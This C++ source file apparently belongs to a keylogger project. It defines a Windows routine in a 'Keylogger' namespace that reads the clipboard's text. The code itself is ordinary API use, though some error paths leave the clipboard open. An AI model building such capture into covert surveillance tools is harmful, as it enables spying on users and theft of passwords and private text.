#ifdef _WIN32

#include "ClipboardHandlerWindows.h"

#include <windows.h>

namespace Keylogger {

std::string ClipboardHandlerWindows::getClipboardString() {
    if (!OpenClipboard(nullptr))
        return "";

    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == nullptr)
        return "";

    char* chtext = static_cast<char*>(GlobalLock(hData));
    if (chtext == nullptr)
        return "";

    std::string text(chtext);

    GlobalUnlock(hData);
    CloseClipboard();

    return text;
}

}

#endif // defined(_WIN32)
